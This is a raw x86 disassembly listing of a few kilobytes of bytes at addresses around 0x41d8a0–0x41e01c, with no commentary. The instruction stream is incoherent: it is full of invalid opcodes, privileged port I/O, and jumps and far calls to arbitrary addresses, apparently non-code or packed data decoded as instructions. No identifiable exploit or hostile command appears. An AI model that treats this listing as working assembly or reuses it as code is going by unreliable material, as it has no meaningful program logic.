  41d8a0:	mov    al,ds:0xe9d41f30
  41d8a5:	fsubr  QWORD PTR [edi-0x49]
  41d8a8:	cs add eax,0x104b6088
  41d8ae:	sub    bh,BYTE PTR [ebx+0x72]
  41d8b1:	sahf   
  41d8b2:	sbb    BYTE PTR [edx+esi*4],ch
  41d8b5:	fldenv [eax+0x173affcf]
  41d8bb:	dec    edx
  41d8bc:	xlat   BYTE PTR ds:[ebx]
  41d8bd:	adc    DWORD PTR [edx+0x4915892d],edx
  41d8c3:	mov    al,0x1d
  41d8c5:	sar    BYTE PTR [esi],0xb9
  41d8c8:	out    0x41,eax
  41d8ca:	pop    ebx
  41d8cb:	popf   
  41d8cc:	arpl   di,sp
  41d8ce:	data16 int3 
  41d8d0:	std    
  41d8d1:	xchg   ebx,eax
  41d8d2:	mov    dh,BYTE PTR [ecx+0x6322c2a5]
  41d8d8:	or     BYTE PTR ds:0x86c004f3,0x39
  41d8df:	jbe    0x41d8c1
  41d8e1:	(bad)  
  41d8e2:	leave  
  41d8e3:	repnz ins DWORD PTR es:[edi],dx
  41d8e5:	jle    0x41d8b3
  41d8e7:	rcl    BYTE PTR [esi+0x3a],cl
  41d8ea:	lods   al,BYTE PTR ds:[esi]
  41d8eb:	sub    eax,0x8b0ad11e
  41d8f0:	fdiv   QWORD PTR [eax]
  41d8f2:	lods   al,BYTE PTR ds:[esi]
  41d8f3:	jmp    0x7da02e4f
  41d8f8:	in     eax,0x10
  41d8fa:	pop    eax
  41d8fb:	inc    esp
  41d8fc:	push   eax
  41d8fd:	xor    bl,BYTE PTR [edx-0x50]
  41d900:	jg     0x41d927
  41d902:	es cmp eax,0x566ca36e
  41d908:	stc    
  41d909:	dec    ebx
  41d90a:	fiadd  WORD PTR [esi+ecx*4]
  41d90d:	lods   al,BYTE PTR ds:[esi]
  41d90e:	jmp    0xace5e125
  41d913:	cmp    BYTE PTR [ebx+0x12],cl
  41d916:	xlat   BYTE PTR ds:[ebx]
  41d917:	or     bh,BYTE PTR [ebx+eax*2]
  41d91a:	jae    0x41d91e
  41d91c:	nop
  41d91d:	mov    ds:0x48bdbf1e,eax
  41d922:	rol    DWORD PTR [ecx],cl
  41d924:	shr    DWORD PTR [esi+edi*2],0x2e
  41d928:	mov    bl,0xd9
  41d92a:	std    
  41d92b:	scas   al,BYTE PTR es:[edi]
  41d92c:	dec    ebx
  41d92d:	mov    edi,edi
  41d92f:	jge    0x41d91f
  41d931:	dec    eax
  41d932:	pop    ecx
  41d933:	fs inc esi
  41d935:	jmp    0x41d912
  41d937:	adc    dl,BYTE PTR [esi-0x6d]
  41d93a:	int3   
  41d93b:	xchg   esp,eax
  41d93c:	arpl   WORD PTR [edx+0x1a],bp
  41d93f:	mov    edx,0xaac0a846
  41d944:	rcr    BYTE PTR [edi],1
  41d946:	xor    edx,esi
  41d948:	sub    DWORD PTR [eax-0x50830576],esp
  41d94e:	mov    DWORD PTR [edx+ebp*4],esp
  41d951:	stos   BYTE PTR es:[edi],al
  41d952:	neg    BYTE PTR [eax]
  41d954:	call   0xc3481818
  41d959:	cwde   
  41d95a:	ja     0x41d9c0
  41d95c:	(bad)  
  41d95d:	jecxz  0x41d96c
  41d95f:	xchg   edi,eax
  41d960:	inc    edi
  41d961:	mov    ds:0x1397f4ea,eax
  41d966:	mov    edi,0xd368bfdf
  41d96b:	xor    esi,DWORD PTR [edi-0x76]
  41d96e:	xor    al,0x19
  41d970:	test   DWORD PTR [eax],edx
  41d972:	dec    edi
  41d973:	add    edx,DWORD PTR [ecx+0x15]
  41d976:	(bad)  
  41d978:	in     eax,0x66
  41d97a:	dec    ebp
  41d97b:	xchg   edi,eax
  41d97c:	stos   DWORD PTR es:[edi],eax
  41d97d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d97e:	or     ebp,ecx
  41d980:	mov    esi,DWORD PTR [esi]
  41d982:	jbe    0x41d93d
  41d984:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d985:	xchg   ecx,eax
  41d986:	fbstp  TBYTE PTR [edi]
  41d988:	cmp    al,0x3f
  41d98a:	ins    BYTE PTR es:[edi],dx
  41d98b:	shl    DWORD PTR [edx+0x37b2c73c],1
  41d991:	pop    esi
  41d992:	fisubr WORD PTR [ebx+0x15]
  41d995:	inc    ebx
  41d996:	add    eax,0xda91a8a8
  41d99b:	sbb    ebp,DWORD PTR [ebp-0x5]
  41d99e:	aas    
  41d99f:	jb     0x41d948
  41d9a1:	cs je  0x41d94d
  41d9a4:	xor    ebx,DWORD PTR gs:[esi]
  41d9a7:	icebp  
  41d9a8:	mov    ds:0x10fe3788,al
  41d9ad:	inc    edx
  41d9ae:	mov    edx,0x2acfdd42
  41d9b3:	mov    esi,edx
  41d9b5:	ja     0x41d93e
  41d9b7:	outs   dx,DWORD PTR ds:[esi]
  41d9b8:	mov    esp,0xa0db3a1
  41d9bd:	pop    edx
  41d9be:	sbb    BYTE PTR [esi+0x7e],ah
  41d9c1:	popa   
  41d9c2:	jg     0x41d956
  41d9c4:	sub    ch,BYTE PTR [eax+0x7a7f9572]
  41d9ca:	out    dx,eax
  41d9cb:	int3   
  41d9cc:	sbb    al,0xe4
  41d9ce:	mov    WORD PTR [eax+0x7fea1e34],?
  41d9d4:	jecxz  0x41da34
  41d9d6:	or     DWORD PTR [esi+0x5cfe8c9b],esi
  41d9dc:	mov    ch,0xbc
  41d9de:	pop    esi
  41d9df:	pop    ds
  41d9e0:	fcmovnbe st,st(6)
  41d9e2:	mov    dl,0xda
  41d9e4:	rol    DWORD PTR [edi-0x30],0xb7
  41d9e8:	cmp    al,0x12
  41d9ea:	pop    ds
  41d9eb:	xchg   ebx,eax
  41d9ec:	cmp    edi,DWORD PTR [ecx-0x42d3ba45]
  41d9f2:	add    al,0x22
  41d9f4:	cmp    cl,dh
  41d9f6:	fldcw  WORD PTR [edx-0x1a]
  41d9f9:	pop    edi
  41d9fa:	dec    ebp
  41d9fb:	push   cs
  41d9fc:	xchg   edx,eax
  41d9fd:	xor    WORD PTR [edx-0x7017c253],dx
  41da04:	jae    0x41d9b5
  41da06:	cld    
  41da07:	loopne 0x41da10
  41da09:	add    DWORD PTR gs:[esi+0x56],esp
  41da0d:	mov    ecx,0xe3b131c3
  41da12:	daa    
  41da13:	dec    edi
  41da14:	ret    
  41da15:	ds sub ebp,ebx
  41da18:	lahf   
  41da19:	sbb    eax,0xc3d5422f
  41da1e:	into   
  41da1f:	jnp    0x41da0f
  41da21:	cmp    ebx,DWORD PTR [eax-0x4d]
  41da24:	jno    0x41da0f
  41da26:	mov    WORD PTR [ebp-0x217493bf],?
  41da2c:	ja     0x41da27
  41da2e:	cmp    al,0x7b
  41da30:	mov    ss,WORD PTR [ebx+0x5c]
  41da33:	jnp    0x41d9ff
  41da35:	inc    ebp
  41da36:	out    0xb6,al
  41da38:	shr    BYTE PTR ds:0x7f9bdc01,1
  41da3e:	mov    al,ds:0x655b4d5b
  41da43:	and    edi,eax
  41da45:	test   eax,0x5d535375
  41da4a:	pop    ss
  41da4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da4c:	in     al,0xdb
  41da4e:	jne    0x41dab9
  41da50:	enter  0x8c0f,0xc
  41da54:	jge    0x41da45
  41da56:	sbb    ebx,DWORD PTR [edx-0x78]
  41da59:	sti    
  41da5a:	inc    ecx
  41da5b:	mov    ds:0x1275be80,eax
  41da60:	rcr    BYTE PTR [esi],1
  41da62:	nop
  41da63:	je     0x41da07
  41da65:	sub    eax,0x51a5a0a0
  41da6a:	mov    ah,0xab
  41da6c:	sub    ch,BYTE PTR [edi+0x4]
  41da6f:	je     0x41d9f5
  41da71:	retf   0x70f0
  41da74:	and    al,0xe0
  41da76:	inc    edi
  41da77:	sub    cl,ch
  41da79:	dec    esp
  41da7a:	jecxz  0x41da0f
  41da7c:	sub    DWORD PTR [esi+ebx*8-0x35],esp
  41da80:	(bad)  
  41da81:	pop    esp
  41da82:	cwde   
  41da83:	add    al,0x9
  41da85:	jle    0x41dabd
  41da87:	add    DWORD PTR [esi+0x7e],0xffffffe9
  41da8b:	dec    eax
  41da8c:	or     dh,BYTE PTR [ecx-0x37]
  41da8f:	pop    ss
  41da90:	stos   DWORD PTR es:[edi],eax
  41da91:	call   0xd4e5:0xb29694a5
  41da98:	and    eax,0x24f99554
  41da9d:	mov    esi,0x14b483a5
  41daa2:	and    dl,BYTE PTR [esi+0x35]
  41daa5:	inc    ebx
  41daa6:	test   al,dl
  41daa8:	sbb    esp,0xfffffffb
  41daab:	pop    DWORD PTR [ebx+edx*4+0x76]
  41daaf:	xchg   edx,eax
  41dab0:	add    DWORD PTR [edi],edx
  41dab2:	mov    dh,0xfb
  41dab4:	dec    esp
  41dab5:	jge    0x41daea
  41dab7:	test   DWORD PTR [edx-0x78fcfad2],eax
  41dabd:	aam    0x10
  41dabf:	mov    ebx,0x125b46d1
  41dac4:	ins    BYTE PTR es:[edi],dx
  41dac5:	sti    
  41dac6:	sbb    edx,DWORD PTR [edi+0x5d4c99d2]
  41dacc:	sbb    eax,0x552a4efd
  41dad1:	add    BYTE PTR [esi+ebx*4-0x38d61082],dh
  41dad8:	call   0xd7b1:0x72645883
  41dadf:	cdq    
  41dae0:	or     eax,0x55ea2f30
  41dae5:	pusha  
  41dae6:	sub    dh,dl
  41dae8:	pop    esp
  41dae9:	js     0x41daf0
  41daeb:	xchg   DWORD PTR [esi],esi
  41daed:	rcl    BYTE PTR [ebp-0x4c],1
  41daf0:	mov    BYTE PTR [edx],bl
  41daf2:	xchg   ebx,eax
  41daf3:	shr    BYTE PTR [esi-0x5c],1
  41daf6:	mov    WORD PTR ds:0x77c26d4,gs
  41dafc:	inc    edi
  41dafd:	pop    eax
  41dafe:	outs   dx,DWORD PTR ds:[esi]
  41daff:	xor    al,0xf2
  41db01:	out    0x1b,al
  41db03:	and    eax,0x27afe1
  41db08:	adc    bh,dh
  41db0a:	inc    DWORD PTR [ecx]
  41db0c:	in     al,dx
  41db0d:	(bad)  
  41db0e:	loopne 0x41dad5
  41db10:	or     bh,BYTE PTR [eax+eiz*2+0x3d]
  41db14:	adc    ch,BYTE PTR [ebx-0x77]
  41db17:	shl    DWORD PTR [ebx-0x697a410a],cl
  41db1d:	int    0x6e
  41db1f:	cwde   
  41db20:	mov    edx,0x6a3ccb41
  41db25:	mov    bh,0xa9
  41db27:	ficom  DWORD PTR [eax+0x67]
  41db2a:	fsubr  DWORD PTR [esi-0x7e]
  41db2d:	pop    ebx
  41db2e:	pop    edx
  41db2f:	out    dx,al
  41db30:	fld    QWORD PTR [ebx+0x7b]
  41db33:	in     eax,0xce
  41db35:	sub    al,0x79
  41db37:	mov    al,ds:0xbce3fa20
  41db3c:	mov    edi,0x94490298
  41db41:	sbb    DWORD PTR [eax+0x7f680502],edi
  41db47:	pop    ebp
  41db48:	(bad)  
  41db49:	xchg   ebx,eax
  41db4a:	mov    esp,0x704991c2
  41db4f:	mov    DWORD PTR [eax+0x76e67100],edx
  41db55:	adc    ah,BYTE PTR [ebp+0x5f]
  41db58:	mov    eax,0xff6598d7
  41db5d:	in     eax,dx
  41db5e:	sbb    BYTE PTR [edi],dl
  41db60:	sbb    BYTE PTR [ebp+edi*1-0x6290ab24],0x5d
  41db68:	into   
  41db69:	popf   
  41db6a:	xchg   ecx,eax
  41db6b:	je     0x41daf3
  41db6d:	sti    
  41db6e:	test   eax,0x114aa29
  41db73:	sbb    cl,dl
  41db75:	daa    
  41db76:	mov    ch,0xb7
  41db78:	aas    
  41db79:	int    0xe8
  41db7b:	lea    edx,[edx+0x350b08dc]
  41db81:	mov    ebx,0x230c6132
  41db86:	and    DWORD PTR [edx-0x478f1128],edi
  41db8c:	icebp  
  41db8d:	pop    ebp
  41db8e:	in     eax,dx
  41db8f:	retf   0x8ced
  41db92:	push   ss
  41db93:	jns    0x41db19
  41db95:	pusha  
  41db96:	test   al,0xb7
  41db98:	mov    DWORD PTR [eax+0x29],ebp
  41db9b:	xor    al,0xc6
  41db9d:	loop   0x41dbdd
  41db9f:	sbb    eax,0x84350ec2
  41dba4:	push   ebx
  41dba5:	sub    edi,DWORD PTR [ecx+ebp*4-0x64b74d5b]
  41dbac:	dec    edx
  41dbad:	and    BYTE PTR ds:0x6f4a72d8,cl
  41dbb3:	sbb    BYTE PTR [ecx],ah
  41dbb5:	xchg   esi,eax
  41dbb6:	out    dx,al
  41dbb7:	cmp    BYTE PTR [esi+0x74751e5a],bl
  41dbbd:	pusha  
  41dbbe:	arpl   WORD PTR [esi],bp
  41dbc0:	pusha  
  41dbc1:	enter  0x4af9,0xf1
  41dbc5:	pop    ecx
  41dbc6:	push   edi
  41dbc7:	cmc    
  41dbc8:	(bad)  
  41dbc9:	scas   eax,DWORD PTR es:[edi]
  41dbca:	rcr    DWORD PTR [edi],cl
  41dbcc:	inc    eax
  41dbcd:	mov    edx,0x5732696b
  41dbd2:	inc    edi
  41dbd3:	push   eax
  41dbd4:	ror    dl,1
  41dbd6:	cdq    
  41dbd7:	test   al,0xb1
  41dbd9:	inc    eax
  41dbda:	xchg   ebp,eax
  41dbdb:	xchg   ecx,eax
  41dbdc:	dec    esi
  41dbdd:	ret    0x774d
  41dbe0:	mov    ch,0x33
  41dbe2:	pop    es
  41dbe3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dbe4:	in     eax,dx
  41dbe5:	bound  ebp,QWORD PTR [eax]
  41dbe7:	xchg   ecx,eax
  41dbe8:	and    al,0x9e
  41dbea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dbeb:	mov    BYTE PTR [edi+0x3f],ch
  41dbee:	inc    edi
  41dbef:	cmp    BYTE PTR [ebp+0x70],0x56
  41dbf3:	ds clc 
  41dbf5:	(bad)
  41dbf9:	fcmovnb st,st(4)
  41dbfb:	test   eax,0x6cfc869a
  41dc00:	shl    DWORD PTR [edi+edx*4+0xe],1
  41dc04:	sub    ah,BYTE PTR [eax+0x7ff0ffa3]
  41dc0a:	sti    
  41dc0b:	push   cs
  41dc0c:	adc    bh,0x69
  41dc0f:	test   DWORD PTR [ecx+0x4e9f36a8],ebp
  41dc15:	sub    DWORD PTR [ebx],edi
  41dc17:	(bad)  
  41dc19:	test   al,0x33
  41dc1b:	rcl    DWORD PTR [ecx+eiz*1+0xd],1
  41dc1f:	mov    al,ds:0x194b9a50
  41dc24:	ror    DWORD PTR [edi-0x700e073],cl
  41dc2a:	xor    al,0x1b
  41dc2c:	pop    esi
  41dc2d:	pop    ds
  41dc2e:	iret   
  41dc2f:	inc    ecx
  41dc30:	inc    esi
  41dc31:	mov    edx,0x52c9c506
  41dc36:	cli    
  41dc37:	(bad)  
  41dc38:	mov    BYTE PTR ds:0xe87ee689,bh
  41dc3e:	xchg   BYTE PTR [edx],bh
  41dc40:	enter  0x416a,0x25
  41dc44:	xchg   ebp,eax
  41dc45:	jl     0x41dbd8
  41dc47:	sub    ecx,DWORD PTR [ebx+esi*4-0x6384aab6]
  41dc4e:	jnp    0x41dc23
  41dc50:	push   0xc
  41dc52:	xchg   esp,eax
  41dc53:	mov    bl,0x43
  41dc55:	shl    edi,1
  41dc57:	add    DWORD PTR [ecx+0x4d],esi
  41dc5a:	ret    0x596f
  41dc5d:	inc    ebx
  41dc5e:	mul    DWORD PTR [ebp+0x2390a157]
  41dc64:	cmp    BYTE PTR [ecx+ebp*2-0x221aa78],cl
  41dc6b:	push   esp
  41dc6c:	shl    DWORD PTR [ebx-0xf],1
  41dc6f:	adc    eax,0x68af5ab
  41dc74:	call   0x56507b0f
  41dc79:	mov    DWORD PTR [ebp-0x47],0xa1ec00ac
  41dc80:	in     eax,0x6f
  41dc82:	xchg   BYTE PTR [esi-0x5e05dca],bh
  41dc88:	dec    esp
  41dc89:	dec    ecx
  41dc8a:	inc    eax
  41dc8b:	adc    edi,DWORD PTR [ecx-0x1d0e2ec]
  41dc91:	repnz add eax,ebp
  41dc94:	fisub  WORD PTR [ebx+0x16]
  41dc97:	push   cs
  41dc98:	and    ah,BYTE PTR [ebp+0x64]
  41dc9b:	pop    edi
  41dc9c:	loop   0x41dc38
  41dc9e:	or     eax,0x9e57f01a
  41dca3:	or     eax,0x5522a9e1
  41dca8:	js     0x41dc55
  41dcaa:	cmp    eax,0xeb89c6b6
  41dcaf:	ja     0x41dc57
  41dcb1:	(bad)  
  41dcb2:	shl    BYTE PTR [ebp-0x7ee49294],cl
  41dcb8:	xor    al,0x71
  41dcba:	cmp    ebx,DWORD PTR [edx]
  41dcbc:	adc    al,0xf0
  41dcbe:	mov    eax,DWORD PTR ds:[eax+0x36390256]
  41dcc5:	dec    edx
  41dcc6:	cdq    
  41dcc7:	stos   BYTE PTR es:[edi],al
  41dcc8:	sub    eax,0xeee6fcc2
  41dccd:	addr16 mov edi,0xd6287327
  41dcd3:	mov    WORD PTR [esi],?
  41dcd5:	mov    dl,0x72
  41dcd7:	fisub  WORD PTR [esi*1+0x419ca63d]
  41dcde:	jb     0x41dcfb
  41dce0:	test   BYTE PTR [esi-0x3df6839],bh
  41dce6:	dec    ebx
  41dce7:	sbb    eax,0x7117bd72
  41dcec:	dec    esi
  41dced:	mov    al,ds:0x27c4b611
  41dcf2:	dec    ebx
  41dcf3:	jmp    0x41dcdb
  41dcf5:	rol    DWORD PTR [edx+0x55],1
  41dcf8:	daa    
  41dcf9:	hlt    
  41dcfa:	(bad)  
  41dcfb:	xchg   ebp,eax
  41dcfc:	mov    bh,0x42
  41dcfe:	rcl    bh,1
  41dd00:	cmp    BYTE PTR [eax+ebp*4+0x4514ee4f],bl
  41dd07:	dec    ebx
  41dd08:	das    
  41dd09:	out    0x26,eax
  41dd0b:	in     al,dx
  41dd0c:	push   ebx
  41dd0d:	sub    eax,esi
  41dd0f:	push   es
  41dd10:	ins    DWORD PTR es:[edi],dx
  41dd11:	aam    0xdf
  41dd13:	fistp  WORD PTR [ebx+edi*4]
  41dd16:	fnstcw WORD PTR [edx+0x4d]
  41dd19:	jmp    0xbb45d014
  41dd1e:	or     eax,0x1add2677
  41dd23:	clc    
  41dd24:	inc    esp
  41dd25:	ja     0x41dd16
  41dd27:	mov    bh,0xab
  41dd29:	jnp    0x41dcd2
  41dd2b:	(bad)  
  41dd2c:	dec    ebx
  41dd2d:	ds sub eax,0x73e426d7
  41dd33:	push   cs
  41dd34:	stos   BYTE PTR es:[edi],al
  41dd35:	xchg   esp,eax
  41dd36:	mov    bh,0xd7
  41dd38:	sub    BYTE PTR [ecx-0x4e33fa1b],al
  41dd3e:	data16 sbb bh,ah
  41dd41:	lahf   
  41dd42:	sbb    eax,0xda69fdf3
  41dd47:	pop    edx
  41dd48:	in     eax,dx
  41dd49:	push   eax
  41dd4a:	adc    ah,BYTE PTR [edx]
  41dd4c:	out    0xfd,al
  41dd4e:	fstp   TBYTE PTR [ebx-0x3d]
  41dd51:	mov    edi,0xb9963633
  41dd56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd57:	sbb    DWORD PTR [ebp-0x232f1ba4],edi
  41dd5d:	je     0x41dd53
  41dd5f:	mov    DWORD PTR [eax-0x5e01cae6],edx
  41dd65:	dec    eax
  41dd66:	popa   
  41dd67:	into   
  41dd68:	rcr    BYTE PTR [ebx-0x772ca020],0xa
  41dd6f:	jg     0x41dd05
  41dd71:	es dec esp
  41dd73:	enter  0xc36e,0xe4
  41dd77:	mov    ss,edi
  41dd79:	add    eax,0x24083b3
  41dd7e:	xlat   BYTE PTR ds:[ebx]
  41dd7f:	cld    
  41dd80:	popa   
  41dd81:	mov    dl,0xd3
  41dd83:	loopne 0x41ddc4
  41dd85:	repz repnz in eax,0x1d
  41dd89:	mov    ds:0xd1868dc2,eax
  41dd8e:	mov    ds:0x73193d28,eax
  41dd93:	in     al,0xea
  41dd95:	lods   al,BYTE PTR ds:[esi]
  41dd96:	(bad)  
  41dd98:	test   al,0x4b
  41dd9a:	fiadd  DWORD PTR [esp+eax*8]
  41dd9d:	and    cl,BYTE PTR [edx+ebx*8+0x7c1f278f]
  41dda4:	ficom  DWORD PTR [edx]
  41dda6:	mov    ds:0x12ac5b11,al
  41ddab:	mov    bh,0xa3
  41ddad:	inc    esi
  41ddae:	nop
  41ddaf:	jmp    0x41dd9b
  41ddb1:	inc    eax
  41ddb2:	pop    edx
  41ddb3:	js     0x41ddfd
  41ddb5:	cmp    DWORD PTR [ebx],ebx
  41ddb7:	outs   dx,DWORD PTR ds:[esi]
  41ddb8:	jae    0x41de1a
  41ddba:	cmp    BYTE PTR gs:0x480bc4d0,cl
  41ddc1:	aad    0x43
  41ddc3:	add    BYTE PTR [esi+0x2d],dh
  41ddc6:	cmp    eax,0x6c6203f5
  41ddcb:	test   dl,ch
  41ddcd:	mov    esp,0xd4e34cc7
  41ddd2:	popf   
  41ddd3:	add    al,0x4c
  41ddd5:	in     eax,dx
  41ddd6:	sub    dh,BYTE PTR [ecx-0x71f464ee]
  41dddc:	inc    esp
  41dddd:	xor    eax,0x343b8013
  41dde2:	xchg   BYTE PTR [ecx-0x19],bh
  41dde5:	cld    
  41dde6:	mov    ecx,0x2055ae0c
  41ddeb:	js     0x41ddd7
  41dded:	imul   ecx,edi,0xf
  41ddf0:	ret    0x4dc2
  41ddf3:	xor    ecx,DWORD PTR [esi+0x36]
  41ddf6:	push   ebx
  41ddf7:	call   0x108f:0x37d4f3ea
  41ddfe:	dec    BYTE PTR [ebx]
  41de00:	push   esi
  41de01:	(bad)  
  41de02:	imul   BYTE PTR [eax-0x2c]
  41de05:	pop    ss
  41de06:	and    ebp,edi
  41de08:	inc    edx
  41de09:	sahf   
  41de0a:	cmp    eax,0xab7d54f3
  41de0f:	test   al,0x9d
  41de11:	and    eax,0xb49c11b8
  41de16:	dec    edi
  41de17:	xchg   edi,eax
  41de18:	fst    QWORD PTR [eax+esi*2-0x4c]
  41de1c:	mov    edi,0x25b959d6
  41de21:	pop    ds
  41de22:	test   DWORD PTR [edi+0x25d00c9f],0xc61c8b7c
  41de2c:	cwde   
  41de2d:	jg     0x41dde4
  41de2f:	mov    ch,0x3f
  41de31:	pop    ds
  41de32:	repz lea eax,[edi]
  41de35:	mov    eax,ecx
  41de37:	mov    ah,0xfa
  41de39:	lock (bad) 
  41de3b:	jp     0x41ddf7
  41de3d:	mov    dl,0xae
  41de3f:	adc    al,0xbb
  41de41:	sbb    al,0xb4
  41de43:	jno    0x41de18
  41de45:	iret   
  41de46:	rcr    BYTE PTR [esi+0x48],1
  41de49:	or     al,0xde
  41de4b:	cmc    
  41de4c:	xor    bh,BYTE PTR [esp+edi*4+0x2a403d89]
  41de53:	or     edx,DWORD PTR [ebx]
  41de55:	clc    
  41de56:	jne    0x41deaa
  41de58:	shr    BYTE PTR [esi+0xde6ed13],cl
  41de5e:	sbb    bl,BYTE PTR [eax-0x53]
  41de61:	fcom   QWORD PTR [ebp-0x55fa388e]
  41de67:	enter  0xef6c,0xae
  41de6b:	push   ecx
  41de6c:	jo     0x41de22
  41de6e:	inc    edx
  41de6f:	adc    eax,0xac1cb026
  41de74:	sbb    DWORD PTR [ebp+0xf7b78f6],0xc92c5ee2
  41de7e:	gs jb  0x41de18
  41de81:	cld    
  41de82:	sbb    DWORD PTR [ecx+eiz*1+0x71],ebp
  41de86:	adc    ah,ah
  41de88:	pop    esp
  41de89:	or     al,0x41
  41de8b:	xchg   edx,eax
  41de8c:	sub    al,0xea
  41de8e:	xor    BYTE PTR [edi-0x6e],ch
  41de91:	pusha  
  41de92:	stos   BYTE PTR es:[edi],al
  41de93:	das    
  41de94:	xchg   edi,eax
  41de95:	mov    cl,bh
  41de97:	or     bl,BYTE PTR [edx-0x39]
  41de9a:	mov    edx,0x7177bae0
  41de9f:	pop    ebp
  41dea0:	add    al,0x15
  41dea2:	mov    dl,0xab
  41dea4:	inc    ebx
  41dea5:	test   BYTE PTR [eax+0x68],ah
  41dea8:	inc    ebx
  41dea9:	test   al,0x19
  41deab:	xor    DWORD PTR [ecx-0x1068c974],edx
  41deb1:	rcl    eax,cl
  41deb3:	ficomp WORD PTR [edx+ebp*8+0x4b978ef5]
  41deba:	adc    al,0x9a
  41debd:	inc    ecx
  41debe:	outs   dx,BYTE PTR ds:[esi]
  41debf:	add    eax,DWORD PTR [eax+esi*1-0x6f]
  41dec3:	sbb    DWORD PTR [eax-0x1a5aea14],0x83cb039b
  41decd:	dec    edx
  41dece:	outs   dx,DWORD PTR es:[esi]
  41ded0:	scas   al,BYTE PTR es:[edi]
  41ded1:	sub    BYTE PTR [ebx],cl
  41ded3:	adc    BYTE PTR [eax+0x4e2be9f5],ch
  41ded9:	sub    eax,0xf09ca4f7
  41dede:	jne    0x41deba
  41dee0:	push   esi
  41dee1:	loopne 0x41de86
  41dee3:	add    eax,0x1c4ebf6f
  41dee8:	jmp    0x199f:0xc06e6f88
  41deef:	inc    esp
  41def0:	aam    0x71
  41def2:	inc    ecx
  41def3:	imul   edi,DWORD PTR [edi+0x77],0x58
  41def7:	loope  0x41df06
  41def9:	mov    ecx,DWORD PTR [ecx]
  41defb:	and    DWORD PTR [esi+0x2c6a9510],ecx
  41df01:	sbb    dh,ah
  41df03:	ror    BYTE PTR [ebx],1
  41df05:	retf   0x2cfc
  41df08:	mov    ds:0x3e07e4a8,al
  41df0d:	inc    esi
  41df0e:	stos   BYTE PTR es:[edi],al
  41df0f:	mov    edx,0xfb5969d
  41df14:	lds    esp,FWORD PTR [ebx-0x3a26aa1c]
  41df1a:	mov    edi,0x35104482
  41df1f:	in     al,dx
  41df20:	leave  
  41df21:	outs   dx,DWORD PTR ds:[esi]
  41df22:	fidivr DWORD PTR [ebp-0x6d]
  41df25:	loopne 0x41df4c
  41df27:	les    ebp,FWORD PTR [ebx+0x72]
  41df2a:	outs   dx,DWORD PTR ds:[esi]
  41df2b:	dec    ebx
  41df2c:	into   
  41df2d:	mov    esi,0xfbfe420d
  41df32:	adc    BYTE PTR [eax+ecx*2],al
  41df35:	fdivr  QWORD PTR [esi-0x6c2f139a]
  41df3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df3c:	test   DWORD PTR [eax-0x22],0x18168e59
  41df43:	fbld   TBYTE PTR [ebp-0x467b809c]
  41df49:	pop    eax
  41df4a:	not    BYTE PTR [edi-0x2de5c3d7]
  41df50:	nop
  41df51:	jno    0x41ded6
  41df53:	mov    WORD PTR [edx-0xc],fs
  41df56:	loopne 0x41dee6
  41df58:	xchg   BYTE PTR [ecx+0x32],al
  41df5b:	add    eax,0xdd02123f
  41df60:	call   FWORD PTR cs:[edi-0x38]
  41df64:	push   cx
  41df66:	jle    0x41dfd3
  41df68:	ror    DWORD PTR [eax],1
  41df6a:	sti    
  41df6b:	cmc    
  41df6c:	mov    dh,0x9e
  41df6e:	cmp    BYTE PTR [ebp-0x59],ch
  41df71:	loop   0x41df74
  41df73:	jmp    0x41dfa7
  41df75:	lahf   
  41df76:	sbb    eax,0xc8204057
  41df7b:	outs   dx,DWORD PTR ds:[esi]
  41df7c:	mov    DWORD PTR [ebx+edi*8],0x3e0043ab
  41df83:	and    ebx,ebx
  41df85:	cmp    DWORD PTR [esi+0x3b5a8559],edi
  41df8b:	mul    BYTE PTR [ebx]
  41df8d:	adc    al,0x6
  41df8f:	(bad)  
  41df90:	out    dx,eax
  41df91:	push   ebx
  41df92:	push   edi
  41df93:	or     al,0xec
  41df95:	adc    ebp,DWORD PTR [esi]
  41df97:	out    dx,eax
  41df98:	mov    ebp,0x4a2b310e
  41df9d:	sbb    BYTE PTR [ebx-0x14],ah
  41dfa0:	inc    ecx
  41dfa1:	mov    cl,0xde
  41dfa3:	xlat   BYTE PTR ds:[ebx]
  41dfa4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dfa5:	(bad)  
  41dfa6:	fwait
  41dfa7:	mov    esi,0x8a26951
  41dfac:	pop    esp
  41dfad:	fcmovne st,st(4)
  41dfaf:	icebp  
  41dfb0:	dec    ebp
  41dfb1:	push   edi
  41dfb2:	mov    bh,BYTE PTR [ebp+0x1c975c5d]
  41dfb8:	ret    0xc798
  41dfbb:	dec    BYTE PTR [edi]
  41dfbd:	fisub  DWORD PTR [ecx+0x47]
  41dfc0:	push   es
  41dfc1:	add    eax,DWORD PTR [ebx+0x546c055e]
  41dfc7:	es pop esp
  41dfc9:	scas   al,BYTE PTR es:[edi]
  41dfca:	pop    ds
  41dfcb:	je     0x41e02f
  41dfcd:	dec    ebx
  41dfce:	push   esp
  41dfcf:	add    eax,0xdbc449b5
  41dfd4:	mov    esi,0xb4f608af
  41dfd9:	test   cl,0x40
  41dfdc:	aaa    
  41dfdd:	jae    0x41e051
  41dfdf:	in     eax,0xbf
  41dfe1:	adc    DWORD PTR [ecx-0x3b8a044],edi
  41dfe7:	dec    edi
  41dfe8:	inc    eax
  41dfe9:	stos   BYTE PTR es:[edi],al
  41dfea:	mov    al,0x92
  41dfec:	addr16 ror bl,0xee
  41dff0:	pushf  
  41dff1:	xchg   edi,eax
  41dff2:	xchg   edi,eax
  41dff3:	pusha  
  41dff4:	xchg   DWORD PTR [edx+0x4c],ebp
  41dff7:	sub    dh,bl
  41dff9:	dec    ecx
  41dffa:	retf   
  41dffb:	jle    0x41df9a
  41dffd:	jmp    0x75b7a481
  41e002:	and    DWORD PTR [eax-0x1b0010be],esp
  41e008:	jns    0x41dfd1
  41e00a:	adc    BYTE PTR [eax-0x33],0x74
  41e00e:	xchg   edi,eax
  41e00f:	xchg   esi,eax
  41e010:	test   eax,0x3c0ca5c7
  41e015:	(bad)  
  41e016:	test   BYTE PTR [edi-0x57],0x17
  41e01a:	adc    DWORD PTR [eax],esi
  41e01c:	sbb    eax,0x37d9d1f8
